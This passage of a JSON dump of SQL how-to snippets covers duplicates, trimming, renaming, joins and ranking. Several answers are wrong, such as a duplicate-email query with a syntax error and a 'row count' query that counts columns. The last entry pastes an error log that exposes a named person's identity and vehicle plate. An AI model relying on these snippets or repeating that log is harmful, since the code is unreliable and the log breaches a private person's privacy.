    "reg_date": "2021-10-12T10:00:29.000Z"
  },
  {
    "id": 4069,
    "keyword": null,
    "link": null,
    "title": " sql query to find duplicate email address",
    "description": "select Id, email, From Person Group BY Id, email  Having Count(*) > 1\n",
    "reg_date": "2021-10-12T10:00:29.000Z"
  },
  {
    "id": 4070,
    "keyword": null,
    "link": null,
    "title": " sql query to find duplicates in column",
    "description": "SELECT name, COUNT(email)  FROM users GROUP BY email HAVING COUNT(email) > 1\n",
    "reg_date": "2021-10-12T10:00:29.000Z"
  },
  {
    "id": 4071,
    "keyword": null,
    "link": null,
    "title": " sql query to find the table size mssql",
    "description": "USE [YourDBName] -- replace your dbname GO SELECT s.Name AS SchemaName, t.Name AS TableName, p.rows AS RowCounts, CAST(ROUND((SUM(a.used_pages) / 128.00), 2) AS NUMERIC(36, 2)) AS Used_MB, CAST(ROUND((SUM(a.total_pages) - SUM(a.used_pages)) / 128.00, 2) AS NUMERIC(36, 2)) AS Unused_MB, CAST(ROUND((SUM(a.total_pages) / 128.00), 2) AS NUMERIC(36, 2)) AS Total_MB FROM sys.tables t INNER JOIN sys.indexes i ON t.OBJECT_ID = i.object_id INNER JOIN sys.partitions p ON i.object_id = p.OBJECT_ID AND i.index_id = p.index_id INNER JOIN sys.allocation_units a ON p.partition_id = a.container_id INNER JOIN sys.schemas s ON t.schema_id = s.schema_id GROUP BY t.Name, s.Name, p.Rows ORDER BY s.Name, t.Name GO \n",
    "reg_date": "2021-10-12T10:00:29.000Z"
  },
  {
    "id": 4072,
    "keyword": null,
    "link": null,
    "title": " sql query to get column names and data types in sql server",
    "description": "SELECT COLUMN_NAME,  \tDATA_TYPE,      IS_NULLABLE,      CHARACTER_MAXIMUM_LENGTH,      NUMERIC_PRECISION,      NUMERIC_SCALE  FROM 'your_database_name'.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='your_table_name';\n",
    "reg_date": "2021-10-12T10:00:30.000Z"
  },
  {
    "id": 4073,
    "keyword": null,
    "link": null,
    "title": " sql query to get the number of rows in a table",
    "description": "SELECT count(*) FROM information_schema.columns WHERE table_name = 'Your_table_nale'; \nselect count(*) from tablename\n",
    "reg_date": "2021-10-12T10:00:30.000Z"
  },
  {
    "id": 4074,
    "keyword": null,
    "link": null,
    "title": " sql query to import data from excel to mysql",
    "description": "$ mysql -u root -p --local-infile mysql> create database boatdb; mysql> use boatdb; \n",
    "reg_date": "2021-10-12T10:00:30.000Z"
  },
  {
    "id": 4075,
    "keyword": null,
    "link": null,
    "title": " sql query to list all tables in a database sql server",
    "description": "USE YOUR_DATABASE_NAME SELECT * FROM INFORMATION_SCHEMA.TABLES\nBY LOVE SINGH on May 19 2020  SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\n",
    "reg_date": "2021-10-12T10:00:30.000Z"
  },
  {
    "id": 4076,
    "keyword": null,
    "link": null,
    "title": " sql query to make a existing column auto increment",
    "description": "Alter table table_name modify column_name datatype(length) AUTO_INCREMENT PRIMARY KEY \n",
    "reg_date": "2021-10-12T10:00:30.000Z"
  },
  {
    "id": 4077,
    "keyword": null,
    "link": null,
    "title": " sql query with replace function",
    "description": "##sql query with replace function #syntax UPDATE tableName SET  column_name = REPLACE(column_name, 'fromStringValue', 'toStringValue');  #Example  Update  tbl_employee Set designation = REPLACE(designation, 'SEO', 'Developer');\nUPDATE employees  SET      phone_number = REPLACE(phone_number, '.', '-');\n",
    "reg_date": "2021-10-12T10:00:30.000Z"
  },
  {
    "id": 4078,
    "keyword": null,
    "link": null,
    "title": " sql quote in string",
    "description": "DECLARE @my_table TABLE (     [value] VARCHAR(200) )  INSERT INTO @my_table VALUES ('hi, my name''s tim.')  SELECT * FROM @my_table\n/*adding single quote into the string in SQL*/ on P.SupplierID=S.SupplierID where S.CompanyName in ('Tokyo Traders','Exotic Liquids','Grandma Kelly''s Homestead') \n",
    "reg_date": "2021-10-12T10:00:30.000Z"
  },
  {
    "id": 4079,
    "keyword": null,
    "link": null,
    "title": " sql raiserror",
    "description": "-- Syntax for SQL Server and Azure SQL Database      RAISERROR ( { msg_id | msg_str | @local_variable }       { ,severity ,state }       [ ,argument [ ,...n ] ] )       [ WITH option [ ,...n ] ]   \n",
    "reg_date": "2021-10-12T10:00:30.000Z"
  },
  {
    "id": 4080,
    "keyword": null,
    "link": null,
    "title": " sql random integer",
    "description": "SELECT RAND();\n",
    "reg_date": "2021-10-12T10:00:31.000Z"
  },
  {
    "id": 4081,
    "keyword": null,
    "link": null,
    "title": " sql random sampling per group",
    "description": "with randomly_sorted_users as (      select         user_id,         signup_date,         row_number() over(partition by date_trunc('year', signup_date)                             order by random()) as random_sort     from         user_table  ) select     user_id,     signup_date from     randomly_sorted_users where     random_sort <= 5\n",
    "reg_date": "2021-10-12T10:00:31.000Z"
  },
  {
    "id": 4082,
    "keyword": null,
    "link": null,
    "title": " sql rank",
    "description": "BY LOVE SINGH, Here, name and id is the column name of the table tbltest.  SELECT \tname, \tRANK () OVER (  \t\tORDER BY id DESC \t) price_rank  FROM \ttbltest;\n-- Employees per department, ranked in salary order SELECT EMPNO,        DEPTNO,        SAL,        rank() OVER (PARTITION BY DEPTNO ORDER BY SAL) AS MYRANK FROM EMP;\n                                     SELECT * FROM ( \tSELECT \t\tproduct_id, \t\tproduct_name, \t\tbrand_id, \t\tlist_price, \t\tRANK () OVER (  \t\t\tPARTITION BY brand_id \t\t\tORDER BY list_price DESC \t\t) price_rank  \tFROM \t\tproduction.products ) t WHERE price_rank <= 3;\n",
    "reg_date": "2021-10-12T10:00:31.000Z"
  },
  {
    "id": 4083,
    "keyword": null,
    "link": null,
    "title": " sql remove characters from string right",
    "description": "SELECT TRIM('   Exemple   ');\t\t\t\t\t\t-- 'Exemple' SELECT LTRIM('   Exemple   ');\t\t\t\t\t\t-- 'Exemple   ' SELECT RTRIM('   Exemple   ');\t\t\t\t\t\t-- '   Exemple' SELECT TRIM(BOTH 'x' FROM 'xxxExemplexxx');\t\t\t-- 'Exemple' SELECT TRIM(LEADING 'x' FROM 'xxxExemplexxx');\t\t-- 'Exemplexxx' SELECT LTRIM('xxxExemplexxx', 'x');\t\t\t\t\t-- 'Exemplexxx' SELECT TRIM(TRAILING 'x' FROM 'xxxExemplexxx'); \t-- 'xxxExemple' SELECT RTRIM('xxxExemple', 'x');\t\t\t\t\t-- 'Exemplexxx'\n",
    "reg_date": "2021-10-12T10:00:31.000Z"
  },
  {
    "id": 4084,
    "keyword": null,
    "link": null,
    "title": " sql remove column from table",
    "description": "ALTER TABLE \"table_name\" DROP \"column_name\";\n                                     ALTER TABLE table_name DROP COLUMN column_name; \nALTER TABLE tableName DROP columnName;\nALTER TABLE my_schema.my_table DROP COLUMN my_column;\nDeletes a column from a table. Example: Removes the first_name column from the users table. ALTER TABLE users DROP COLUMN first_name\n",
    "reg_date": "2021-10-12T10:00:31.000Z"
  },
  {
    "id": 4085,
    "keyword": null,
    "link": null,
    "title": " sql remove decimal places",
    "description": "-- use cast UPDATE my_table SET my_column = CAST(my_column AS INT) WHERE ...; -- or convert UPDATE my_table SET my_column = CONVERT(INT, my_column) WHERE ...;\n",
    "reg_date": "2021-10-12T10:00:31.000Z"
  },
  {
    "id": 4086,
    "keyword": null,
    "link": null,
    "title": " sql remove first character from string",
    "description": "UPDATE MyTable SET MyColumn = RIGHT(MyColumn, LEN(MyColumn) - 1);\n",
    "reg_date": "2021-10-12T10:00:31.000Z"
  },
  {
    "id": 4087,
    "keyword": null,
    "link": null,
    "title": " sql remove last x char",
    "description": "REVERSE(SUBSTR( REVERSE(_column), x)) AS , _column_minus_x\n",
    "reg_date": "2021-10-12T10:00:31.000Z"
  },
  {
    "id": 4088,
    "keyword": null,
    "link": null,
    "title": " sql remove leading spaces",
    "description": "SELECT TRIM('   Exemple   ');\t\t\t\t\t\t-- 'Exemple' SELECT LTRIM('   Exemple   ');\t\t\t\t\t\t-- 'Exemple   ' SELECT RTRIM('   Exemple   ');\t\t\t\t\t\t-- '   Exemple' SELECT TRIM(BOTH 'x' FROM 'xxxExemplexxx');\t\t\t-- 'Exemple' SELECT TRIM(LEADING 'x' FROM 'xxxExemplexxx');\t\t-- 'Exemplexxx' SELECT LTRIM('xxxExemplexxx', 'x');\t\t\t\t\t-- 'Exemplexxx' SELECT TRIM(TRAILING 'x' FROM 'xxxExemplexxx'); \t-- 'xxxExemple' SELECT RTRIM('xxxExemple', 'x');\t\t\t\t\t-- 'Exemplexxx'\n",
    "reg_date": "2021-10-12T10:00:31.000Z"
  },
  {
    "id": 4089,
    "keyword": null,
    "link": null,
    "title": " sql remove non numeric characters",
    "description": "SELECT REGEXP_REPLACE( fieldname, '[^[:digit:]]', '' ) AS newfieldname FROM tablename\n",
    "reg_date": "2021-10-12T10:00:31.000Z"
  },
  {
    "id": 4090,
    "keyword": null,
    "link": null,
    "title": " sql remove spaces",
    "description": "SELECT REPLACE(' Hello World ',' ','')\nSELECT TRIM('   Exemple   ');\t\t\t\t\t\t-- 'Exemple' SELECT LTRIM('   Exemple   ');\t\t\t\t\t\t-- 'Exemple   ' SELECT RTRIM('   Exemple   ');\t\t\t\t\t\t-- '   Exemple' SELECT TRIM(BOTH 'x' FROM 'xxxExemplexxx');\t\t\t-- 'Exemple' SELECT TRIM(LEADING 'x' FROM 'xxxExemplexxx');\t\t-- 'Exemplexxx' SELECT LTRIM('xxxExemplexxx', 'x');\t\t\t\t\t-- 'Exemplexxx' SELECT TRIM(TRAILING 'x' FROM 'xxxExemplexxx'); \t-- 'xxxExemple' SELECT RTRIM('xxxExemple', 'x');\t\t\t\t\t-- 'Exemplexxx'\nSelect TRIM (' Word  ')\nLTRIM(RTRIM(ColumnName))\nSELECT RTRIM(LTRIM(' Word ')) \nSELECT REPLACE(' Hello World ',' ')\n",
    "reg_date": "2021-10-12T10:00:32.000Z"
  },
  {
    "id": 4091,
    "keyword": null,
    "link": null,
    "title": " sql rename column",
    "description": "--The following example renames the column TerritoryID in the table Sales.SalesTerritory to TerrID in the AdventureWorks database.  EXEC sp_rename 'Sales.SalesTerritory.TerritoryID', 'TerrID', 'COLUMN';\nALTER TABLE STUDENTS   RENAME TO ARTISTS;  \nEXEC SP_RENAME 'TABLE_NAME.OLD_COLUMN_NAME','NEW_COLUMN_NAME'\n-- Oracle, MySQL 8+ ALTER TABLE table_name RENAME COLUMN current_name TO new_name; -- MySQL < 8: ALTER TABLE table_name CHANGE current_name new_name datatype(length); -- SQL Server: EXEC SP_RENAME 'table_name.current_name' , 'new_name', 'COLUMN'\nEXEC sp_RENAME 'table_name.old_name', 'new_name', 'COLUMN' \nEXEC sp_rename 'Sales.SalesTerritory.TerritoryID', 'TerrID', 'COLUMN'; \n",
    "reg_date": "2021-10-12T10:00:32.000Z"
  },
  {
    "id": 4092,
    "keyword": null,
    "link": null,
    "title": " sql rename column in select",
    "description": "EXEC SP_RENAME 'TABLE_NAME.OLD_COLUMN_NAME','NEW_COLUMN_NAME'\n-- Oracle, MySQL 8+ ALTER TABLE table_name RENAME COLUMN current_name TO new_name; -- MySQL < 8: ALTER TABLE table_name CHANGE current_name new_name datatype(length); -- SQL Server: EXEC SP_RENAME 'table_name.current_name' , 'new_name', 'COLUMN'\nALTER TABLE table_name RENAME COLUMN old_name TO new_name;\nSELECT NAME AS \"Employee Name\" FROM PEOPLE;  SELECT p.NAME AS \"Employee Name\", s.SALARY AS \"Employee Salary\" FROM PEOPLE p JOIN SALARIES s ON p.ID = s.ID;\nEXEC sp_rename 'Sales.SalesTerritory.TerritoryID', 'TerrID', 'COLUMN'; \nSELECT data.column AS `Label`\n",
    "reg_date": "2021-10-12T10:00:32.000Z"
  },
  {
    "id": 4093,
    "keyword": null,
    "link": null,
    "title": " sql replace character in string in all records",
    "description": "UPDATE employees  SET      phone_number = REPLACE(phone_number, '.', '-');\n",
    "reg_date": "2021-10-12T10:00:32.000Z"
  },
  {
    "id": 4094,
    "keyword": null,
    "link": null,
    "title": " sql request with jpa hiberna",
    "description": "Query q = em.createNativeQuery(\"SELECT a.firstname, a.lastname FROM Author a\"); List<Object[]> authors = q.getResultList();   for (Object[] a : authors) {     System.out.println(\"Author \"             + a[0]             + \" \"             + a[1]); } \n",
    "reg_date": "2021-10-12T10:00:32.000Z"
  },
  {
    "id": 4095,
    "keyword": null,
    "link": null,
    "title": " sql reset auto increment",
    "description": "ALTER TABLE table_name AUTO_INCREMENT = 1;\nALTER TABLE tmp AUTO_INCREMENT = 3;\nDBCC CHECKIDENT (mytable, RESEED, 0)\nALTER TABLE tablename AUTO_INCREMENT = 1\nSET  @num := 0;  UPDATE your_table SET id = @num := (@num+1);  ALTER TABLE your_table AUTO_INCREMENT =1;\n",
    "reg_date": "2021-10-12T10:00:32.000Z"
  },
  {
    "id": 4096,
    "keyword": null,
    "link": null,
    "title": " sql restore backup query",
    "description": "RESTORE FILELISTONLY FROM DISK = 'D:BackUpYourBaackUpFile.bak' \n",
    "reg_date": "2021-10-12T10:00:32.000Z"
  },
  {
    "id": 4097,
    "keyword": null,
    "link": null,
    "title": " sql reverse order of results",
    "description": "SELECT q.*      FROM (SELECT TOP 3 *                FROM table                ORDER BY id DESC) q     ORDER BY q.id ASC\n",
    "reg_date": "2021-10-12T10:00:32.000Z"
  },
  {
    "id": 4098,
    "keyword": null,
    "link": null,
    "title": " sql right characters",
    "description": "-- For Oracle only  -- syntax  SUBSTR(<main-string>,-<number-of-characters>)  -- example  SUBSTR('Useless stuff',-9) -- OUTPUT: ess stuff  -- practical example SELECT SUBSTR('Useless stuff',-9) FROM DUAL;\n",
    "reg_date": "2021-10-12T10:00:32.000Z"
  },
  {
    "id": 4099,
    "keyword": null,
    "link": null,
    "title": " sql right join",
    "description": "SELECT table1.column1, table2.column2... FROM table1 LEFT JOIN table2 ON table1.common_field = table2.common_field; \nSELECT * FROM table_1 RIGHT JOIN table_2 ON table_1.common_field = table_2.common_field;\n-- LEFT OUTER JOIN is equivalent to LEFT JOIN -- b.VALUE1 is null when ID not in table2 (idem for c.VALUE1 in table3) SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    LEFT OUTER JOIN table2 b ON a.ID = b.ID   LEFT OUTER JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000;  -- &dArr; Test it &dArr; (Fiddle source link)\n#The RIGHT JOIN keyword Return all rows from the right table (table_name2), even if there are no #matches in the left table (table_name1).  syntax->SELECT column_name(s) FROM table_name1 RIGHT JOIN table_name2 ON table_name1.column_name=table_name2.column_name  ////example//// SELECT Persons.LastName, Persons.FirstName, Orders.OrderNo FROM Persons RIGHT JOIN Orders ON Persons.P_Id=Orders.P_Id ORDER BY Persons.LastName  \nRIGHT JOIN: Matching part from both table and unmatching part from right table.\n SELECT column_name(s)  FROM table1  RIGHT JOIN table2  ON table1.column_name = table2.column_name;  \n",
    "reg_date": "2021-10-12T10:00:33.000Z"
  },
  {
    "id": 4100,
    "keyword": null,
    "link": null,
    "title": " sql roll up rows into columns",
    "description": "SELECT     SS.SEC_NAME,    STUFF((SELECT '; ' + US.USR_NAME            FROM USRS US           WHERE US.SEC_ID = SS.SEC_ID           ORDER BY USR_NAME           FOR XML PATH('')), 1, 1, '') [SECTORS/USERS] FROM SALES_SECTORS SS GROUP BY SS.SEC_ID, SS.SEC_NAME ORDER BY 1\n",
    "reg_date": "2021-10-12T10:00:33.000Z"
  },
  {
    "id": 4101,
    "keyword": null,
    "link": null,
    "title": " sql row having max",
    "description": "SELECT t1.* FROM employees t1 INNER JOIN (     SELECT id, max(salary) AS salary FROM employees GROUP BY id ) t2 ON t1.id = t2.id AND t1.salary = t2.salary;\n",
    "reg_date": "2021-10-12T10:00:33.000Z"
  },
  {
    "id": 4102,
    "keyword": null,
    "link": null,
    "title": " sql rownum",
    "description": "USE AdventureWorks2012;   GO   SELECT FirstName, LastName, TerritoryName, ROUND(SalesYTD,2,1) AS SalesYTD,   ROW_NUMBER() OVER(PARTITION BY TerritoryName ORDER BY SalesYTD DESC)    AS Row   FROM Sales.vSalesPerson   WHERE TerritoryName IS NOT NULL AND SalesYTD <> 0   ORDER BY TerritoryName;   \nSELECT t.A, t.B, t.C, ROW_NUMBER() OVER (ORDER BY t.A) as newId   FROM dbo.tableZ AS t   ORDER BY t.A;\nSELECT     ROW_NUMBER() OVER (  ORDER BY first_name    ) row_num,    first_name,     last_name,     city FROM     sales.customers; \nReturns results where the row number meets the passed condition. Example: Returns the top 10 countries from the countries table. SELECT * FROM countries WHERE ROWNUM <= 10;\nSELECT ROWNUM, a.* FROM (SELECT customers.*       FROM customers       WHERE customer_id > 4500       ORDER BY last_name) a;\n",
    "reg_date": "2021-10-12T10:00:33.000Z"
  },
  {
    "id": 4103,
    "keyword": null,
    "link": null,
    "title": " sql rtrim",
    "description": "SELECT TRIM('   Exemple   ');\t\t\t\t\t\t-- 'Exemple' SELECT LTRIM('   Exemple   ');\t\t\t\t\t\t-- 'Exemple   ' SELECT RTRIM('   Exemple   ');\t\t\t\t\t\t-- '   Exemple' SELECT TRIM(BOTH 'x' FROM 'xxxExemplexxx');\t\t\t-- 'Exemple' SELECT TRIM(LEADING 'x' FROM 'xxxExemplexxx');\t\t-- 'Exemplexxx' SELECT LTRIM('xxxExemplexxx', 'x');\t\t\t\t\t-- 'Exemplexxx' SELECT TRIM(TRAILING 'x' FROM 'xxxExemplexxx'); \t-- 'xxxExemple' SELECT RTRIM('xxxExemple', 'x');\t\t\t\t\t-- 'Exemplexxx'\nSELECT RTRIM('SQL Tutorial     ') AS RightTrimmedString;\n",
    "reg_date": "2021-10-12T10:00:33.000Z"
  },
  {
    "id": 4104,
    "keyword": null,
    "link": null,
    "title": " sql run multiple updates in one query",
    "description": "UPDATE table_name SET   field_name =        case  field_name2        when 'value' then 'change_to'       when 'value2' then 'change_to2' end\n",
    "reg_date": "2021-10-12T10:00:33.000Z"
  },
  {
    "id": 4105,
    "keyword": null,
    "link": null,
    "title": " sql safe mode",
    "description": "SET SQL_SAFE_UPDATES = 0;\nSET SQL_SAFE_UPDATES = 0; \nsql safe mode\nUPDATE tablename SET columnname=1;\n",
    "reg_date": "2021-10-12T10:00:33.000Z"
  },
  {
    "id": 4106,
    "keyword": null,
    "link": null,
    "title": " sql script get all stored procedures from database",
    "description": "SELECT    SCHEMA_NAME(schema_id) AS [Schema],   name FROM sys.objects WHERE type = 'P';\n",
    "reg_date": "2021-10-12T10:00:33.000Z"
  },
  {
    "id": 4107,
    "keyword": null,
    "link": null,
    "title": " sql script to remove default from column",
    "description": "DECLARE @tableName VARCHAR(MAX) = '<MYTABLENAME>' DECLARE @columnName VARCHAR(MAX) = '<MYCOLUMNAME>' DECLARE @ConstraintName nvarchar(200) SELECT @ConstraintName = Name  FROM SYS.DEFAULT_CONSTRAINTS WHERE PARENT_OBJECT_ID = OBJECT_ID(@tableName)  AND PARENT_COLUMN_ID = (     SELECT column_id FROM sys.columns     WHERE NAME = @columnName AND object_id = OBJECT_ID(@tableName)) IF @ConstraintName IS NOT NULL     EXEC('ALTER TABLE '+@tableName+' DROP CONSTRAINT ' + @ConstraintName)      -- Just replace <MYTABLENAME> and <MYCOLUMNNAME>\n",
    "reg_date": "2021-10-12T10:00:33.000Z"
  },
  {
    "id": 4108,
    "keyword": null,
    "link": null,
    "title": " sql search all columns of database oracle sql",
    "description": "select table_name from all_tab_columns where column_name = 'PICK_COLUMN'; \n",
    "reg_date": "2021-10-12T10:00:33.000Z"
  },
  {
    "id": 4109,
    "keyword": null,
    "link": null,
    "title": " sql searching via key word",
    "description": "SELECT id, description FROM table WHERE MATCH (description) AGAINST('keyword1 keyword2')\nSELECT id, category, location FROM table WHERE (     category LIKE '%keyword%'     OR location LIKE '%keyword%' )\n",
    "reg_date": "2021-10-12T10:00:33.000Z"
  },
  {
    "id": 4110,
    "keyword": null,
    "link": null,
    "title": " sql select",
    "description": "Used to select data from a database, which is then returned in a results set. Example 1: Selects all columns from all users. SELECT * FROM users; Example 2: Selects the first_name and surname columns from all users.xx SELECT first_name, surname FROM users;\nselect [all/distinct] <COL1>, <COL2>, <COL3> from <TABLE_NAME> [join <JOIN_CONDITION>] [where <CONDITION>] [group by <COLUMN_NAME>] [having <SEARCH_CONDITION>] [order by <SORT_SPECIFICATION>]   /* Specifically for SQL -> Oracle  LEGEND:  [...]   :   optional entries <...>   :   your specific entry */\nSELECT * FROM TABLE_NAME;\nEverything in brackets is optional. SELECT [all/distinct] <COL1>, <COL2>, <COL3> FROM <TABLE_NAME> [JOIN <JOIN_CONDITION>] [WHERE <CONDITION>] [GROUP BY <COLUMN_NAME>] [HAVING <SEARCH_CONDITION>] [ORDER BY <SORT_SPECIFICATION>]\nSELECT * FROM products WHERE stock_count <= 10 ORDER BY stock_count ASC;\nMit SELECT k&ouml;nnen Daten aus der Datenbank abgefragt werden. Es ist die am  meissten verbreitete Art.    SELECT name   FROM country   WHERE region = (       SELECT region       FROM country       WHERE name = 'Brasilien'       ) \n",
    "reg_date": "2021-10-12T10:00:34.000Z"
  },
  {
    "id": 4111,
    "keyword": null,
    "link": null,
    "title": " sql select all from one table and one column from another",
    "description": "SELECT myTable.*, otherTable.foo, otherTable.bar...\n",
    "reg_date": "2021-10-12T10:00:34.000Z"
  },
  {
    "id": 4112,
    "keyword": null,
    "link": null,
    "title": " sql select all from table",
    "description": "SELECT * FROM tableName;\n",
    "reg_date": "2021-10-12T10:00:34.000Z"
  },
  {
    "id": 4113,
    "keyword": null,
    "link": null,
    "title": " sql select all records from all tables where not empty",
    "description": "SELECT r.table_name, r.row_count, r.[object_id] FROM sys.tables t INNER JOIN (     SELECT OBJECT_NAME(s.[object_id]) table_name, SUM(s.row_count) row_count, s.[object_id]     FROM sys.dm_db_partition_stats s     WHERE s.index_id in (0,1)     GROUP BY s.[object_id] ) r on t.[object_id] = r.[object_id] WHERE r.row_count > 0 ORDER BY r.table_name;\n",
    "reg_date": "2021-10-12T10:00:34.000Z"
  },
  {
    "id": 4114,
    "keyword": null,
    "link": null,
    "title": " sql select all tables from database change url",
    "description": "UPDATE wp_options SET option_value = replace(option_value, 'http://www.oldurl', 'http://www.newurl') WHERE option_name = 'home' OR option_name = 'siteurl';  UPDATE wp_posts SET guid = replace(guid, 'http://www.oldurl','http://www.newurl');  UPDATE wp_posts SET post_content = replace(post_content, 'http://www.oldurl', 'http://www.newurl');  UPDATE wp_postmeta SET meta_value = replace(meta_value,'http://www.oldurl','http://www.newurl'); \n",
    "reg_date": "2021-10-12T10:00:34.000Z"
  },
  {
    "id": 4115,
    "keyword": null,
    "link": null,
    "title": " sql select between two dates",
    "description": "select Date, TotalAllowance from Calculation where EmployeeId = 1              and Date between '2011/02/25' and '2011/02/27' \n/*the BETWEEN operator is used to filter the result set within  a certain range. the values can be numbers, texts or dates */ SELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2;\nSELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2;\nSELECT * FROM  [table]  WHERE [time] >='2014-04-08 23:53:00.000' AND [time] <= '2014-04-08 23:58:00.000' \n",
    "reg_date": "2021-10-12T10:00:34.000Z"
  },
  {
    "id": 4116,
    "keyword": null,
    "link": null,
    "title": " sql select ciunt",
    "description": "SELECT COUNT(column_name) FROM table_name WHERE condition;\n",
    "reg_date": "2021-10-12T10:00:34.000Z"
  },
  {
    "id": 4117,
    "keyword": null,
    "link": null,
    "title": " sql select column with value NULL",
    "description": "SELECT * FROM table_name WHERE column_name IS NULL\n",
    "reg_date": "2021-10-12T10:00:34.000Z"
  },
  {
    "id": 4118,
    "keyword": null,
    "link": null,
    "title": " sql select connect by level",
    "description": "SELECT trunc(sysdate) + level FROM DUAL CONNECT BY level <= 10;\n",
    "reg_date": "2021-10-12T10:00:34.000Z"
  },
  {
    "id": 4119,
    "keyword": null,
    "link": null,
    "title": " sql select contem uma palavra",
    "description": "SELECT * FROM PESSOA WHERE Nome LIKE 'J%'; \n",
    "reg_date": "2021-10-12T10:00:34.000Z"
  },
  {
    "id": 4120,
    "keyword": null,
    "link": null,
    "title": " sql select data from last week",
    "description": "select id from tbname  where date between date_sub(now(),INTERVAL 1 WEEK) and now();\nselect id from tbname where date between date_sub(now(),INTERVAL 1 WEEK) and now();\n",
    "reg_date": "2021-10-12T10:00:34.000Z"
  },
  {
    "id": 4121,
    "keyword": null,
    "link": null,
    "title": " sql select distinct",
    "description": "SELECT DISTINCT column1, column2, ...   FROM table_name; \ninsert into your_table (col1, col2, col3) select distinct col1, 'newval', col3 from your_table\nWhen querying data from a table, you may get duplicate rows. In order to remove these duplicate rows, you use the DISTINCT clause in the SELECT statement.  Here is the syntax of the DISTINCT clause:  SELECT DISTINCT     select_list FROM     table_name;\nSELECT DISTINCT ma_colonne FROM nom_du_tableau\nSELECT DISTINCT column1, column1, ..... FROM TABLE /*DISTINCT WILL NOT SELECT THE SAME VALUES IN SAME COLUMN*/\nSELECT Country FROM Customers;\n",
    "reg_date": "2021-10-12T10:00:35.000Z"
  },
  {
    "id": 4122,
    "keyword": null,
    "link": null,
    "title": " sql select except null",
    "description": "SELECT mycolumn FROM mytable WHERE mycolumn IS NOT NULL;\nSELECT column_names FROM table_name WHERE column_name IS NOT NULL;\n",
    "reg_date": "2021-10-12T10:00:35.000Z"
  },
  {
    "id": 4123,
    "keyword": null,
    "link": null,
    "title": " sql select first and last record of each group",
    "description": "select v.* from (select v.*,              row_number() over (partition by vehicleid, tripid order by datetime asc) as seqnum_asc,              row_number() over (partition by vehicleid, tripid order by datetime desc) as seqnum_desc       from vehicles v      ) v where seqnum_asc = 1 or seqnum_desc = 1;\n",
    "reg_date": "2021-10-12T10:00:35.000Z"
  },
  {
    "id": 4124,
    "keyword": null,
    "link": null,
    "title": " sql select first record of each group",
    "description": "On Oracle 9.2+ (not 8i+ as originally stated), SQL Server 2005+, PostgreSQL 8.4+, DB2, Firebird 3.0+, Teradata, Sybase, Vertica: WITH summary AS (     SELECT p.id,             p.customer,             p.total,             ROW_NUMBER() OVER(PARTITION BY p.customer                                   ORDER BY p.total DESC) AS rk       FROM PURCHASES p) SELECT s.*   FROM summary s  WHERE s.rk = 1 Supported by any database: But you need to add logic to break ties:    SELECT MIN(x.id),  -- change to MAX if you want the highest          x.customer,           x.total     FROM PURCHASES x     JOIN (SELECT p.customer,                  MAX(total) AS max_total             FROM PURCHASES p         GROUP BY p.customer) y ON y.customer = x.customer                               AND y.max_total = x.total GROUP BY x.customer, x.total\n",
    "reg_date": "2021-10-12T10:00:35.000Z"
  },
  {
    "id": 4125,
    "keyword": null,
    "link": null,
    "title": " sql select first row",
    "description": "SELECT your_column FROM your_table WHERE your_condition LIMIT 5; -- your limit of rows you want to show here\n-- NOTE: This is for Oracle/PLSQL only  -- > EXAMPLE select *  from CONSUMERS where ROWNUM <= 1  /* -- > SYNTAX select *  from {yourTable} where ROWNUM <= {number-of-rows}  */\nIn MySQL, top 50 rows are displayed by using this following query: SELECT * FROM LIMIT 0, 50;\n",
    "reg_date": "2021-10-12T10:00:35.000Z"
  },
  {
    "id": 4126,
    "keyword": null,
    "link": null,
    "title": " sql select from multiple tables with conditions",
    "description": "-- b.VALUE1 is null when ID not in table2 -- LEFT OUTER JOIN is equivalent to LEFT JOIN SELECT a.ID, a.NAME, b.VALUE1 FROM1 table1 a  LEFT OUTER JOIN table2 b ON a.ID = b.ID WHERE a.ID >= 1000; -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T10:00:35.000Z"
  },
  {
    "id": 4127,
    "keyword": null,
    "link": null,
    "title": " sql select from multiple tables without join",
    "description": "SELECT TableA.*, TableB.*, TableC.*, TableD.* FROM TableA     JOIN TableB         ON TableB.aID = TableA.aID     JOIN TableC         ON TableC.cID = TableB.cID     JOIN TableD         ON TableD.dID = TableA.dID WHERE DATE(TableC.date)=date(now())  \n-- UNION: distinct values (slower) SELECT emp_name AS name from employees UNION        SELECT cust_name AS name from customers;  -- UNION ALL: keeps duplicates (faster) SELECT emp_name AS name from employees UNION ALL       SELECT cust_name AS name from customers;\nSELECT Books_Namn, Author_Namn, Author_Age, Store_Namn FROM books  JOIN Author ON Author_Id = Author_Author_Id  JOIN Books_has_Store ON Books_Books_Id = Books_Id  JOIN Store ON Store_Id = Store_Store_Id;\n",
    "reg_date": "2021-10-12T10:00:35.000Z"
  },
  {
    "id": 4128,
    "keyword": null,
    "link": null,
    "title": " sql select into",
    "description": "Select * into Backup_of_Student_info from student_info\nSELECT NAME, ADDRESS, PHONE INTO v_employee_name, v_employee_address, v_employee_phone_number FROM EMPLOYEE WHERE EMPLOYYE_ID = 6;\n\tSELECT * INTO nome_da_tabela_que_estao_a_mexer_BKP \tFROM nome_da_tabela_que_estao_a_mexer\nWed, 17 Mar 2021 15:19:22 GMT  Failed to execute target procedure ORA-06502: PL/SQL: numeric or value error: character string buffer too small ORA-06512: at \"CMFIN_09.CMA_FICHA_MANTER\", line 790 ORA-06512: at line 33    DAD name: cmfin_09   PROCEDURE  : CMA_FICHA_MANTER.inserir_trata   URL        : http://rai-dc-appdev.gov.cv:80/cmfin_09/CMA_FICHA_MANTER.inserir_trata   PARAMETERS :   ===========   sessid:    20081725210350882001   p_id:    67828   qual_utente:    0   p_marca:    VOLKSWAGEN   p_especie:    AUTOM&Oacute;VEL   p_cilindrada:    3500   p_matricula:    st-00-ZL   p_dt_matricula:    23-02-2021   p_registo:    232   p_memo:       p_activo:    on   P_ANO_ISENCAO_JUROS:    NULL   p_utente_id:    97610                   p_utente:    Aderito Filipe Pina Goncalves                   btnConfirmar:    32    12    ENVIRONMENT:   ============     PLSQL_GATEWAY=WebDb     